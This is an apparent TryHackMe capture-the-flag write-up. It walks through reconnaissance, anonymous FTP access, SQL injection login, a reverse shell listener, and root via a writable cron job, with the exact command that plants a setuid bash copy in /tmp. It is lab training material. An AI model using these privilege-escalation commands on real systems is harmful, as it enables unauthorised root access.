2025-03-05 · writeup · tryhackme

Overview

Step-by-step notes from a TryHackMe room — covering enumeration, exploitation, and privilege escalation. Flags redacted per THM rules.

Reconnaissance

Ran a full TCP scan:

nmap -sV -sC -A -p- 10.10.x.x

Open ports: 21 (FTP), 22 (SSH), 80 (HTTP).

Enumeration

  • Anonymous FTP was enabled — listed files, found creds.txt.
  • Directory brute-force with gobuster revealed /admin.
  • Login form was vulnerable to SQL injection.

Exploitation

Logged in with SQLi payload and gained admin access. Uploaded a reverse shell:

nc -lvnp 4444

Caught the shell as www-data.

Privilege Escalation

Ran linpeas.sh — found a writable cron job running as root:

echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/script.sh

Then:

/tmp/rootbash -p

Root shell obtained. Read /root/root.txt.

Key Lessons

  • Anonymous FTP is still common in older CTF rooms — always check.
  • Writable cron jobs = easy root.
  • linpeas saves hours of manual enumeration.
